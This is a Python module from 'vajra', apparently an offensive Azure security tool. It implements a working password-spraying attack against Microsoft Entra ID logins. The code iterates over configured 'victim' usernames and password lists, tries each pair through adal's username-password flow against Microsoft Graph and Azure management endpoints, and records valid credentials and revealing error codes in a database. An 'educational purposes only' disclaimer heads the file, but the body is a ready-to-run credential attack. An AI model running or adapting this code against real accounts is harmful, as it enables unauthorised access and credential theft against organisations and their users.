# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
# All rights reserved to Raunak Parmar

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.

from email import message
import adal
from sqlalchemy.sql.expression import false, true
from vajra import db
from sqlalchemy.sql import text
from vajra.models import bruteforceConfig, bruteforceLogs, bruteforceResult
                 


class bruteforceAttack():

    def spray(uuid, password, endpoints, victim):
        sccuess = false
        for endpoint in endpoints:
            endpoint = endpoint[2]

            try:
                context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None, proxies=None, verify_ssl=True)
                token = context.acquire_token_with_username_password(endpoint, victim, password, '1b730954-1685-4b74-9bfd-dac224a7b894')
                sccuess = true
                db.session.add(bruteforceResult(uuid=uuid, victim=victim, password=password, errorCode="", message="", endpoint=endpoint))
                message = f"<br><span style=\"color:#7FFFD4\">[+] {victim} : {password}</span>"
                db.session.add(bruteforceLogs(uuid=uuid, message=message))
                db.session.commit()
                return true

            except adal.adal_error.AdalError as e:
                try:
                    error_code = e.error_response['error_codes'][0]
                    error_description = e.error_response['error_description'].split(": ")[1]
                    message = error_description.split("\n")[0]
                    errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
                    db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                    if error_code != 50126:
                        res = bruteforceResult(uuid=uuid, victim=victim, password=password, errorCode=error_code, message=message, endpoint=endpoint)
                        db.session.add(res)

                    db.session.commit()    
                    return true
                except TypeError as f:
                    result = str(e)
                    print(e)
                
                

            if sccuess == true:
                pass
                

    def startAttack(uuid):
        db.engine.execute(text("UPDATE attack_status SET bruteforce ='True' WHERE uuid = :uuid"), uuid=uuid)
        
        endpoints = [
            [1, "aad_graph_api", "https://graph.windows.net"],
            [2, "ms_graph_api", "https://graph.microsoft.com"],
            [3, "azure_mgmt_api", "https://management.azure.com"],
            [4, "windows_net_mgmt_api", "https://management.core.windows.net"]
            ]

        usernames = bruteforceConfig.query.filter_by(uuid=uuid).filter(bruteforceConfig.usernames != None).all()
        passwords = bruteforceConfig.query.filter_by(uuid=uuid).filter(bruteforceConfig.passwords != None).all()


        for victim in usernames:
            victim = victim.usernames
            db.session.query(bruteforceResult).filter_by(uuid=uuid, victim=victim).delete()
            for password in passwords:
                password = password.passwords
                message = f"<br><span style=\"color:yellow\">[!] {victim} : {password} </span>" 
                db.session.add(bruteforceLogs(uuid=uuid, message=message))
                res = bruteforceAttack.spray(uuid, password, endpoints, victim)
                if res == true:
                    break
            db.session.rollback()
        db.engine.execute(text("UPDATE attack_status SET bruteforce ='False' WHERE uuid = :uuid"), uuid=uuid)
